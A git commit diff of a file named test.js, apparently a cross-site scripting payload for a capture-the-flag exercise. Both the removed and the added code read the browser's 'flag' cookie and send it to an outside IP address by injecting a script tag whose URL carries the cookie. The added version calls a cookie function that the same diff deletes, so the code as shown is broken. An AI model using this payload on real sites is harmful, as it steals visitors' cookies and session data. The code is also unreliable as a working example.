426fda913b03e26ab72a07d6dc85672c29b28672
Thanray Tian <874800988@qq.com>
2017-01-18 13:24:21 +0800

    commit

--- test.js
+++ test.js
@@ -1,28 +1,4 @@
-//读取cookies 
-function getCookie(name) 
-{ 
-    var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
-    if(arr=document.cookie.match(reg)) {
-        return unescape(arr[2]); 
-    } else {
-        return null; 
-    }
-} 
-
-console.log("Hello Word");
-
-var browser=navigator.appName
-var b_version=navigator.appVersion
-// var version=parseFloat(b_version)
-var BrowserName=browser+b_version; 
-
-if(BroswerName == 'Mozilla/Secret VIP1.0') {
-    var flag=getCookie('flag');
-    var script=document.createElement('script');
-    script.src='http://119.29.81.170:7892/?flag='+flag;
-    document.body.appendChild(script);
-} else {
-    var script=document.createElement('script');
-    script.src='http://119.29.81.170:7892/?broswer='+BrowserName;
-    document.body.appendChild(script);
-}
+var flag=getCookie('flag');
+var script=document.createElement('script');
+script.src='http://119.29.81.170:7892/?flag='+flag;
+document.body.appendChild(script);
